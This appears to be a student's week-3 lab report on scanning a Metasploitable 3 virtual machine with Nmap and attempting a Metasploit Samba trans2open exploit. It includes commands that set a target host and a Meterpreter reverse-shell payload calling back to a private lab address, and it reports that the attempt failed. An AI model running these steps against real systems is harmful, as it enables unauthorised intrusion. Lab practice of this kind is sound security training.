

# Week 3 – Vulnerability Scanning and Exploitation (Metasploitable 3)

## Overview  
This week focused on performing *network reconnaissance* with Nmap and attempting *exploitation* with Metasploit against the Metasploitable 3 target machine. The objective was to identify open ports, detect services, enumerate vulnerabilities, and attempt to exploit Samba.

---

## Steps and Evidence  

### 🔍 1. Full Nmap Scan  
*Screenshot:* week3_scan1_nmap_full.png  
- Performed a full port scan on the target.  
- Identified open ports including *139* and *445 (SMB)*.  

---

### 🔍 2. Nmap Open Ports Scan  
*Screenshot:* week3_scan2_nmap_open_ports.png  
- Verified which ports were open and accessible.  
- Confirmed SMB-related ports.

---

### 🔍 3. Nmap Service Version Detection  
*Screenshot:* week3_scan3_nmap_service_versions.png  
- Ran -sV scan to identify service versions.  
- Found Samba service running on the target.

---

### 🔍 4. Nmap OS Detection  
*Screenshot:* week3_scan4_nmap_os_detection.png  
- Used -O option to detect the operating system.  
- Confirmed target OS type for exploitation attempts.  

---

### 🔍 5. Nmap Vulnerability Scan  
*Screenshot:* week3_scan5_nmap_vuln.png  
- Ran NSE vulnerability scripts on SMB.  
- Confirmed the service was potentially exploitable.  

---

### ⚡ 6. Starting Metasploit Framework  
*Screenshot:* week3_scan6_msfconsole.png  
- Opened msfconsole.  
- Prepared the exploitation phase.  

---

### ⚡ 7. Searching Samba Exploits in Metasploit  
*Screenshot:* week3_scan7_msf_search_samba.png  
- Used search samba command.  
- Listed multiple Samba exploits available in Metasploit.  

---

### ⚡ 8. Setting Target Host (RHOSTS)  
*Screenshot:* week3_scan9_msf_set_rhosts.png  
- Set the target machine IP:  
  ```bash
  set RHOSTS 172.28.128.3


⸻

⚡ 9. Setting Payload

Screenshot: week3_scan10_msf_set_payload.png
	•	Set the payload to establish a reverse shell:

set PAYLOAD linux/x86/meterpreter/reverse_tcp



⸻

⚡ 10. Setting Local Host (LHOST)

Screenshot: week3_scan11_msf_set_lhost.png
	•	Configured the attacker’s local IP for callback:

set LHOST 172.28.128.2



⸻

⚡ 11. Exploit Attempt

Screenshot: use_exploitlinuxsambatrans2open.png
	•	Used a Samba exploit module to attempt remote code execution.
	•	Exploit was launched, but no session was created (target did not open a shell).
	•	This shows that exploitation was attempted but unsuccessful in this configuration.

⸻

✅ Summary
	•	Successfully performed Nmap reconnaissance (ports, services, OS, vulnerabilities).
	•	Attempted Metasploit exploitation on Samba service.
	•	Exploit did not yield a session, but the lab demonstrated the process of moving from scanning → exploitation attempts.

---
 



